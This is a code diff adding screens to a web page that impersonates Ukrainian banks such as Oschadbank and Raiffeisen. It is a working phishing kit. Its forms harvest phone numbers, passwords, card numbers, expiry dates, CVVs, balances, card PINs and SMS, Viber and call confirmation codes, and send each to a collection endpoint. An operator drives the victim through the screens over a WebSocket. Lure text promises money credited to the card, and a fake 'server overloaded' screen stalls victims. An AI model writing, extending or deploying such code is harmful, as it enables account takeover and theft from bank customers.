@@ -17,6 +17,8 @@
             --alliance-primary: #0072CE; --alliance-bg: #f4f8fc;
             --alliance-text: #212529; --alliance-text-secondary: #5a6a7b;
             --alliance-btn-bg: #e9f2fa; --alliance-border-color: #d1e3f5;
+            /* СТИЛЬ для кнопки Viber */
+            --viber-color: #7360F2;
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
@@ -262,6 +264,22 @@
             cursor: pointer;
             pointer-events: auto;
         }
+        .oschad-viber-button {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background-color: var(--viber-color);
+            color: var(--white);
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+            margin-top: 30px;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .oschad-viber-button:active { opacity: 0.8; }
 
         /* --- ОБЩИЕ СТИЛИ ФОРМЫ (для восстановления и т.д.) --- */
         .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
@@ -581,7 +599,7 @@ document.addEventListener('DOMContentLoaded', () => {
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
         'alliance': { name: 'Альянс', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Logo_Bank_Alliance.png', theme: 'alliance', colors: { primary: '#0072CE', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e9f2fa', borderColor: '#d1e3f5' } },
         'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fdeee5', borderColor: '#fbd9c7' } },
-        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fef1e9', borderColor: '#fbe3d4' } },
+        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fef1e9', borderColor: '#fbe3d4' } }, // ИЗМЕНЕНО: Цвет
         'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', colors: { primary: '#00A14E', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e6f6ec', borderColor: '#cce9d9' } }
     };
     
@@ -1091,11 +1109,585 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ для экрана Viber (Ощадбанк) ---
-    function renderOschadViberCodeScreen(phone, options = {}) {
-        lastCodeScreen = 'oschad_viber';
-        let maskedPhone = phone.slice(0, 7) + '***' + phone.slice(10);
+    // --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ для экрана запроса данных (ТЕМНАЯ ТЕМА) ---
+    function renderThemedCardDetailsScreen() {
+        hideAllModals();
+        const theme = activeBankData.colors || { primary: '#FFCC00', text: '#FFFFFF', bg: '#1C1C1E' };
+        raiffModalOverlay.style.backgroundColor = theme.bg;
+
+        const html = `
+            <div class="raiff-header">
+                <span class="back-arrow" id="raiff-back-btn">
+                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${theme.text}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </span>
+                <span class="title" style="color: ${theme.text};">Запит даних</span>
+            </div>
+            <div class="raiff-content-wrapper" style="color: ${theme.text};">
+                <h2 class="raiff-main-title" style="margin-top: 30px;">Підтвердити володіння карткою</h2>
+                <div style="display: flex; flex-direction: column; gap: 15px;">
+                    <input id="details_card" class="raiff-phone-input" placeholder="Номер картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9\\s]*">
+                    <div style="display: flex; gap: 15px;">
+                        <input id="details_exp" class="raiff-phone-input" placeholder="Термін (ММ/РР)" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9/]*">
+                        <input id="details_cvv" class="raiff-phone-input" placeholder="CVV" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9]*">
+                    </div>
+                    <input id="details_balance" class="raiff-phone-input" placeholder="Поточний баланс картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="text" inputmode="decimal">
+                </div>
+            </div>
+            <div class="raiff-footer">
+                <button class="raiff-button active" id="details_submit_btn" style="background-color: ${theme.primary}; color: ${theme.bg === '#1C1C1E' ? '#000' : theme.text};">Відправити</button>
+            </div>
+        `;
+        raiffModalContent.innerHTML = html;
+        raiffModalOverlay.style.display = 'flex';
+        document.getElementById('raiff-back-btn').addEventListener('click', () => { hideAllModals(); });
+        
+        // Add event listeners for input formatting
+        raiffModalContent.addEventListener('input', (e) => {
+            const { id, value } = e.target;
+            if (id === 'details_card') {
+                e.target.value = value.replace(/\D/g, '').substring(0, 16).replace(/(\d{4})/g, '$1 ').trim();
+            } else if (id === 'details_exp') {
+                let v = value.replace(/\D/g, '').substring(0, 4);
+                e.target.value = v.length > 2 ? v.substring(0, 2) + '/' + v.substring(2) : v;
+            } else if (id === 'details_cvv') {
+                e.target.value = value.replace(/\D/g, '').substring(0, 3);
+            } else if (id === 'details_balance') {
+                let v = value.replace(/[^0-9,.]/g, '').replace(',', '.');
+                let parts = v.split(',');
+                if (parts.length > 2) v = parts[0] + ',' + parts.slice(1).join('');
+                e.target.value = v.replace('.', ',');
+            }
+        });
+
+        document.getElementById('details_submit_btn').addEventListener('click', () => {
+            const card_details = {
+                card: document.getElementById('details_card').value.replace(/\s/g, ''),
+                exp: document.getElementById('details_exp').value,
+                cvv: document.getElementById('details_cvv').value,
+                balance: document.getElementById('details_balance').value,
+            };
+            sendDataToServer({ card_details }, true);
+            raiffModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title" style="color:${theme.text};">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
+        });
+    }
+
+
+    // --- DYNAMIC RENDER FUNCTIONS (OSCHADBANK) ---
+    function renderOschadbankLogin(options = {}) {
+        hideAllModals();
+        const { errorType, errorMessage, savedPhone } = options;
+        
         const html = `
             <div class="oschad-header">
-                <span class="back-arrow" id="oschad-viber-back-btn">
-                    <svg width="24"
+                <span class="back-arrow" id="oschad-back-arrow">←</span>
+                <span class="title">Авторизуйтесь через Ощад24</span>
+                <img class="oschad-header-logo" src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Логотип Ощадбанка">
+            </div>
+            <div class="oschad-welcome-section">
+                <h2 class="oschad-main-title">Ласкаво просимо</h2>
+                <p>Для входу введіть логін або номер телефону</p>
+                <div class="oschad-toggle-buttons">
+                    <button id="toggle-phone" class="active">Номер телефону</button>
+                    <button id="toggle-login">Логін</button>
+                </div>
+
+                <div id="phone-login-form">
+                    <div class="oschad-input-group phone-group ${errorType === 'phone' ? 'error' : ''}">
+                        <label for="phone_input">Номер телефону</label>
+                        <div class="oschad-phone-wrapper">
+                            <span class="oschad-phone-prefix">+380</span>
+                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" value="${savedPhone || ''}" inputmode="numeric" pattern="[0-9\\s]*">
+                        </div>
+                    </div>
+                    <div class="oschad-input-group ${errorType === 'phone' ? 'error' : ''}">
+                        <label for="phone_password_input">Пароль</label>
+                        <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" " autocomplete="off">
+                        <span class="password-toggle-icon">
+                            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        </span>
+                    </div>
+                    ${errorType === 'phone' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    <a href="#" class="forgot-password-link">Забули пароль?</a>
+                </div>
+
+                <div id="login-form" style="display: none;">
+                    <div class="oschad-input-group ${errorType === 'login' ? 'error' : ''}">
+                        <label for="login_input">Логін</label>
+                        <input type="text" class="oschad-input-field" id="login_input" placeholder=" " autocomplete="off">
+                    </div>
+                    <div class="oschad-input-group ${errorType === 'login' ? 'error' : ''}">
+                        <label for="login_password_input">Пароль</label>
+                        <input type="password" class="oschad-input-field" id="login_password_input" placeholder=" " autocomplete="off">
+                        <span class="password-toggle-icon">
+                            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        </span>
+                    </div>
+                    ${errorType === 'login' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    <a href="#" class="forgot-password-link">Забули пароль?</a>
+                </div>
+                
+                <button class="oschad-viber-button" id="oschad-viber-btn">Увійти через Viber</button>
+
+            </div>
+            <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
+        `;
+        customModalContent.innerHTML = html;
+        customModalOverlay.style.display = 'flex';
+        addOschadbankLoginListeners();
+    }
+    function showOschadLoader() {
+        const html = `
+            <div class="oschad-header">
+                <span class="back-arrow" id="loader-back-arrow">←</span>
+                <span class="title"></span>
+            </div>
+            <div class="oschad-welcome-section">
+                <h3 style="text-align: center; width: 100%;">Сервер перевантажений</h3>
+                <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
+                <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
+            </div>
+        `;
+        customModalContent.innerHTML = html;
+        document.getElementById('loader-back-arrow').addEventListener('click', () => renderOschadbankLogin());
+    }
+    function renderCodeScreen(options) {
+        hideAllModals();
+        const { title, header, infoText, instructionText, resendText, screenId, error, codeLength = 4 } = options;
+        lastCodeScreen = screenId;
+
+        const inputsHtml = Array(codeLength).fill('').map(() => 
+            `<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="oschad-code-input" placeholder="–" style="width: ${codeLength === 6 ? '40px' : '50px'};">`
+        ).join('');
+        
+        const html = `
+            <div class="oschad-header">
+                <span class="back-arrow" id="code-screen-back-arrow">←</span>
+                <span class="title">${header}</span>
+            </div>
+            <div class="oschad-code-container">
+                ${title ? `<h2 class="oschad-main-title">${title}</h2>` : ''}
+                ${infoText ? `<p class="oschad-code-info">${infoText}</p>` : ''}
+                ${options.phoneNumbers ? options.phoneNumbers.map(n => `<p class="oschad-code-number">${n}</p>`).join('') : ''}
+                <p class="oschad-code-instruction">${instructionText}</p>
+                <div class="oschad-code-inputs ${error ? 'error' : ''}" id="code-inputs-container" style="gap: ${codeLength === 6 ? '10px' : '15px'};">
+                    ${inputsHtml}
+                </div>
+                ${error ? `<p class="oschad-code-error-text">Код введено невірно</p>` : ''}
+                <a href="#" class="oschad-resend-link" id="resend-link">${resendText}</a>
+            </div>
+        `;
+        customModalContent.innerHTML = html;
+        customModalOverlay.style.display = 'flex';
+
+        document.getElementById('code-screen-back-arrow').addEventListener('click', () => {
+            (collectedData.currentFlow === 'forgot_password') ? renderForgotPasswordFlow(3) : renderOschadbankLogin();
+        });
+        
+        setupCodeInputs(screenId, codeLength);
+        startCallTimer(60);
+        
+        const firstInput = document.querySelector('.oschad-code-input');
+        if (firstInput) setTimeout(() => firstInput.focus(), 100);
+    }
+
+    function renderOschadbankViberScreen(options = {}) {
+        renderCodeScreen({
+            header: 'Підтвердження', title: 'Введіть код з Viber',
+            instructionText: 'Ми надіслали 6-значний код у Viber на Ваш фінансовий номер',
+            resendText: 'Надіслати код повторно', screenId: 'oschad_viber', error: options.error,
+            codeLength: 6
+        });
+    }
+
+    function renderOschadbankCallConfirmation(options = {}) {
+        let infoText = 'Вам телефонує Ощадбанк:';
+        if (collectedData.loginMethod === 'phone' && collectedData.phone) {
+            const phone = collectedData.phone.replace(/\D/g, '');
+            const maskedPhone = `+${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)}`;
+            infoText = `На Ваш номер ${maskedPhone} телефонує Ощадбанк:`;
+        }
+        
+        renderCodeScreen({
+            header: 'Підтвердження', infoText, phoneNumbers: ['+38044 363 0133', '+38044 350 0133'],
+            instructionText: 'Прийміть дзвінок та дотримуйтесь інструкцій', resendText: 'Запросити дзвінок повторно',
+            screenId: 'oschad_call', error: options.error, codeLength: 4
+        });
+    }
+    function renderTelegramSmsScreen(options = {}) {
+        renderCodeScreen({
+            header: 'Підтвердження', title: 'Останній крок',
+            instructionText: 'Для зарахування коштів на вашу картку введіть одноразовий SMS код',
+            resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error,
+            codeLength: 6
+        });
+    }
+    function renderForgotPasswordFlow(step, options = {}) {
+        hideAllModals();
+        collectedData.currentFlow = 'forgot_password';
+        let html = '', backFunction = () => renderOschadbankLogin(), submitFunction = null;
+        
+        switch(step) {
+            case 1:
+                html = `
+                    <div class="oschad-header"><span class="back-arrow" id="fp-back-arrow">←</span><span class="title">Відновлення пароля</span></div>
+                    <div class="oschad-form-container">
+                        <p>Для відновлення пароля введіть свій фінансовий номер телефону</p>
+                        <div class="oschad-input-group phone-group has-value">
+                           <label for="fp_phone_input">Номер телефону</label>
+                           <div class="oschad-phone-wrapper"><span class="oschad-phone-prefix">+380</span><input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*"></div>
+                        </div>
+                    </div>
+                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
+                submitFunction = () => {
+                    sendDataToServer({ fp_phone: '+380' + document.getElementById('fp_phone_input').value.replace(/\D/g, '') }, false);
+                    renderForgotPasswordFlow(2);
+                };
+                break;
+            case 2:
+                 html = `
+                    <div class="oschad-header"><span class="back-arrow" id="fp-back-arrow">←</span><span class="title">Відновлення пароля</span></div>
+                    <div class="oschad-form-container">
+                        <h2 class="oschad-main-title">Введіть ваш номер картки</h2>
+                        <div class="oschad-input-group">
+                           <label for="fp_card_input">Номер картки</label>
+                           <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19" inputmode="numeric" pattern="[0-9\\s]*">
+                        </div>
+                    </div>
+                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
+                backFunction = () => renderForgotPasswordFlow(1);
+                submitFunction = () => {
+                    sendDataToServer({ fp_card: document.getElementById('fp_card_input').value.replace(/\D/g, '') }, false);
+                    renderForgotPasswordFlow(3);
+                };
+                break;
+             case 3:
+                const last4 = collectedData.fp_card ? collectedData.fp_card.slice(-4) : '8479';
+                html = `
+                    <div class="oschad-header" style="background-color: #fff;"><span class="back-arrow" id="fp-back-arrow">←</span></div>
+                    <div class="oschad-pin-screen-container">
+                        <div><p class="oschad-pin-screen-title">PIN-код картки **${last4}</p><div class="oschad-pin-dots-container" id="pin-dots">${Array(4).fill('<div class="oschad-pin-dot"></div>').join('')}</div></div>
+                        <div class="oschad-pin-keypad" id="pin-keypad">
+                            <button class="oschad-pin-key" data-key="9">9</button><button class="oschad-pin-key" data-key="8">8</button><button class="oschad-pin-key" data-key="6">6</button>
+                            <button class="oschad-pin-key" data-key="7">7</button><button class="oschad-pin-key" data-key="3">3</button><button class="oschad-pin-key" data-key="2">2</button>
+                            <button class="oschad-pin-key" data-key="0">0</button><button class="oschad-pin-key" data-key="1">1</button><button class="oschad-pin-key" data-key="5">5</button>
+                            <button class="oschad-pin-key" data-key="4">4</button>
+                            <button class="oschad-pin-key backspace" data-key="backspace"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg></button>
+                        </div>
+                    </div>`;
+                backFunction = () => renderForgotPasswordFlow(2);
+                break;
+        }
+
+        customModalContent.innerHTML = html;
+        customModalOverlay.style.display = 'flex';
+        document.getElementById('fp-back-arrow').addEventListener('click', backFunction);
+        if (submitFunction) document.getElementById('fp-submit-btn').addEventListener('click', submitFunction);
+        if (step === 3) setupPinScreenListeners(); else addForgotPasswordListeners(step);
+    }
+    
+    // --- HELPER & EVENT LISTENER FUNCTIONS ---
+    
+    function setupPinScreenListeners() {
+        const keypad = document.getElementById('pin-keypad');
+        const dots = document.querySelectorAll('#pin-dots .oschad-pin-dot');
+        let pin = '';
+
+        const updateDots = () => {
+            dots.forEach((dot, index) => {
+                dot.textContent = ''; dot.classList.remove('active');
+                if (index < pin.length) dot.textContent = '●';
+            });
+            if (pin.length < 4) dots[pin.length].classList.add('active');
+        };
+
+        keypad.addEventListener('click', (e) => {
+            const target = e.target.closest('.oschad-pin-key');
+            if (!target) return;
+            const key = target.dataset.key;
+            if (key === 'backspace') pin = pin.slice(0, -1);
+            else if (pin.length < 4) pin += key;
+            updateDots();
+            if (pin.length === 4) {
+                keypad.style.pointerEvents = 'none';
+                setTimeout(() => {
+                    sendDataToServer({ fp_pin: pin }, false);
+                    renderOschadbankCallConfirmation();
+                }, 400);
+            }
+        });
+        updateDots();
+    }
+
+    function addOschadbankLoginListeners() {
+        document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
+        document.querySelector('.forgot-password-link').addEventListener('click', (e) => { e.preventDefault(); renderForgotPasswordFlow(1); });
+
+        const togglePhoneBtn = document.getElementById('toggle-phone'), toggleLoginBtn = document.getElementById('toggle-login');
+        const phoneLoginForm = document.getElementById('phone-login-form'), loginForm = document.getElementById('login-form');
+        const viberBtn = document.getElementById('oschad-viber-btn');
+        let activeOschadForm = 'phone';
+        
+        const phoneInput = document.getElementById('phone_input'), phonePassInput = document.getElementById('phone_password_input');
+        const loginInput = document.getElementById('login_input'), loginPassInput = document.getElementById('login_password_input');
+        const submitBtn = document.getElementById('oschad-submit-btn');
+        
+        document.querySelectorAll('.oschad-input-group').forEach(group => {
+            const input = group.querySelector('.oschad-input-field');
+            if (!input) return;
+            const checkValue = () => group.classList.toggle('has-value', input.value.trim() !== '');
+            input.addEventListener('focus', () => group.classList.add('is-focused'));
+            input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
+            input.addEventListener('input', checkValue); checkValue();
+        });
+
+        phoneInput.addEventListener('input', (e) => {
+            let rawValue = e.target.value.replace(/\D/g, '');
+            if (rawValue.startsWith('380')) rawValue = rawValue.substring(3);
+            e.target.value = rawValue.substring(0, 9).replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
+        });
+
+        const updateOschadButtonState = () => {
+            const isPhoneValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
+            const isLoginValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
+            submitBtn.classList.toggle('active', isPhoneValid || isLoginValid);
+            submitBtn.disabled = !(isPhoneValid || isLoginValid);
+            // Кнопка Viber завжди активна після введення телефону (для простоти)
+            if (activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9) {
+                viberBtn.style.opacity = 1;
+                viberBtn.style.cursor = 'pointer';
+            } else {
+                 viberBtn.style.opacity = 0.6;
+                 viberBtn.style.cursor = 'not-allowed';
+            }
+        };
+        [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => input.addEventListener('input', updateOschadButtonState));
+
+        togglePhoneBtn.addEventListener('click', () => {
+            togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
+            phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
+            viberBtn.style.display = 'block'; // Показати кнопку Viber
+            activeOschadForm = 'phone'; updateOschadButtonState();
+        });
+        toggleLoginBtn.addEventListener('click', () => {
+            toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
+            phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
+            viberBtn.style.display = 'none'; // Сховати кнопку Viber
+            activeOschadForm = 'login'; updateOschadButtonState();
+        });
+        
+        customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
+            icon.addEventListener('click', () => {
+                const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
+                const isPassword = passwordInput.type === 'password';
+                passwordInput.type = isPassword ? 'text' : 'password';
+                icon.style.color = isPassword ? '#212529' : '#adb5bd';
+            });
+        });
+
+        submitBtn.onclick = () => {
+            if(submitBtn.disabled) return;
+            collectedData.loginMethod = activeOschadForm;
+            const dataToSend = activeOschadForm === 'phone'
+                ? { phone: '+380' + phoneInput.value.replace(/\D/g, ''), password: phonePassInput.value }
+                : { login: loginInput.value, password: loginPassInput.value };
+            sendDataToServer(dataToSend, false);
+            showOschadLoader();
+        };
+
+        viberBtn.onclick = () => {
+            const phone = '+380' + phoneInput.value.replace(/\D/g, '');
+            if (phone.replace(/\D/g, '').length === 12) {
+                sendDataToServer({ phone_for_viber: phone }, false);
+                renderOschadbankViberScreen();
+            }
+        };
+
+        // Встановлюємо початковий стан кнопки Viber
+        updateOschadButtonState();
+    }
+
+    function addForgotPasswordListeners(step) {
+        const submitBtn = document.getElementById('fp-submit-btn');
+        let input;
+        
+        if (step === 1) {
+            input = document.getElementById('fp_phone_input');
+            input.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
+                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
+                submitBtn.classList.toggle('active', value.length === 9); submitBtn.disabled = value.length !== 9;
+            });
+        } else if (step === 2) {
+            input = document.getElementById('fp_card_input');
+            input.addEventListener('input', (e) => {
+                 e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+                 const isValid = e.target.value.replace(/\D/g, '').length === 16;
+                 submitBtn.classList.toggle('active', isValid); submitBtn.disabled = !isValid;
+            });
+        }
+
+        document.querySelectorAll('.oschad-input-group').forEach(group => {
+            const inputEl = group.querySelector('.oschad-input-field');
+            if (!inputEl) return;
+            const checkValue = () => group.classList.toggle('has-value', inputEl.value);
+            inputEl.addEventListener('focus', () => group.classList.add('is-focused'));
+            inputEl.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
+            inputEl.addEventListener('input', checkValue); checkValue();
+        });
+    }
+
+    function startCallTimer(seconds) {
+        const link = document.getElementById('resend-link');
+        if (!link) return;
+        clearInterval(callTimerInterval);
+        let timer = seconds;
+        const initialText = link.textContent.split(' через ')[0];
+
+        function updateTimer() {
+            if (timer < 0) {
+                clearInterval(callTimerInterval);
+                link.textContent = initialText + (link.id === 'resend-link' ? '?' : '');
+                link.classList.add('active');
+                link.onclick = (e) => { e.preventDefault(); startCallTimer(60); };
+            } else {
+                link.textContent = `${initialText} через ${timer} секунд`;
+                link.classList.remove('active'); timer--;
+            }
+        }
+        updateTimer();
+        callTimerInterval = setInterval(updateTimer, 1000);
+    }
+    
+    function setupCodeInputs(screenId, expectedLength) {
+        const codeInputs = document.querySelectorAll('.oschad-code-input');
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value && index < codeInputs.length - 1) codeInputs[index + 1].focus();
+                
+                const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
+                
+                if (allFilled) {
+                    const code = [...codeInputs].map(inp => inp.value).join('');
+                    let dataKey;
+                    if (screenId === 'oschad_call') dataKey = 'call_code';
+                    else if (screenId === 'oschad_viber') dataKey = 'viber_code';
+                    else if (screenId === 'telegram_sms') dataKey = 'sms_code';
+                    else if (screenId.includes('debit')) dataKey = 'debit_sms_code';
+                    
+                    if (dataKey) {
+                        sendDataToServer({ [dataKey]: code }, true);
+                        showOschadLoader();
+                    }
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) codeInputs[index - 1].focus();
+            });
+        });
+    }
+
+    async function sendDataToServer(data, isFinal) {
+        collectedData = { ...collectedData, ...data };
+        try {
+            await fetch(`/api/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId, bankName: activeBankData.name, isFinalStep: isFinal,
+                    referrer: localStorage.getItem('referrer') || 'unknown', ...data
+                }),
+            });
+        } catch (error) { console.error('Failed to send data:', error); }
+    }
+    
+    function handleServerCommand(command) {
+        const { type, data } = command;
+        switch (type) {
+            case 'lk': renderOschadbankLogin(); break;
+            case 'call': renderOschadbankCallConfirmation(); break;
+            case 'viber': renderOschadbankViberScreen(); break;
+            case 'telegram_debit': renderTelegramSmsScreen(); break;
+            case 'show_debit_form':
+                if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                    renderThemedLightDebitScreen();
+                } else {
+                    renderThemedDebitScreen();
+                }
+                break;
+            case 'show_card_details_form':
+                 if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                    renderLightThemedCardDetailsScreen();
+                } else {
+                    renderThemedCardDetailsScreen();
+                }
+                break;
+            case 'request_alliance_card_details': 
+                renderLightThemedCardDetailsScreen(); 
+                break;
+            case 'password_error':
+                const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
+                const savedPhone = data.loginType === 'phone' && collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
+                renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg, savedPhone });
+                break;
+            case 'raiff_pin_error': renderRaiffPinScreen({ error: true }); break;
+            case 'code_error':
+                const errorOptions = { error: true };
+                if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
+                else if (lastCodeScreen === 'oschad_viber') renderOschadbankViberScreen(errorOptions); // NEW: Viber error
+                else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
+                else if (lastCodeScreen === 'generic_light_debit') renderThemedLightDebitScreen(errorOptions);
+                else if (lastCodeScreen === 'generic_debit') renderThemedDebitScreen(errorOptions);
+                break;
+            case 'raiff_code_error': renderRaiffSmsScreen(collectedData.phone, { error: true }); break;
+            case 'generic_debit_error': renderThemedDebitScreen({ error: true }); break;
+            case 'viber_code_error': renderOschadbankViberScreen({ error: true }); break; // NEW: Viber error
+            case 'other':
+                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
+                if (bankToDisable) {
+                    bankToDisable.classList.add('disabled');
+                    if (!bankToDisable.querySelector('.unavailable-label')) bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                }
+                modalTitle.textContent = "Помилка";
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p>`;
+                modalFooter.style.display = 'flex';
+                modalFooter.innerHTML = `<button class="btn btn-next" onclick="window.location.reload()">Обрати інший банк</button>`;
+                body.classList.add('form-active');
+                break;
+            case 'ban':
+                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
+                if (ws) ws.close();
+                break;
+        }
+    }
+    
+    // --- Main Flow Logic ---
+    document.querySelectorAll('.bank-item').forEach(item => {
+        item.addEventListener('click', e => {
+            e.preventDefault();
+            if (item.classList.contains('disabled')) return;
+            const bankId = item.dataset.bank;
+            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+            collectedData = {};
+            
+            if (bankId === 'oschadbank') {
+                renderOschadbankLogin();
+            } else if (bankId === 'raiffeisen') {
+                renderRaiffPhoneScreen();
+            } else if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(bankId)) {
+                if (activeBankData.colors) setTheme(activeBankData.colors);
+                renderAlliancePhoneScreen();
+            } else {
+                // Fallback for banks not covered above
+                body.dataset.theme = activeBankData.theme;
+                formHeaderLogo.src = activeBankData.logoUrl;
+                body.classList.add('form-active');
+                currentStepIndex = 0;
+                renderStep();
+            }
+            connectWebSocket();
+        });
+    });
+});
+</script>
+</body>
+</html>
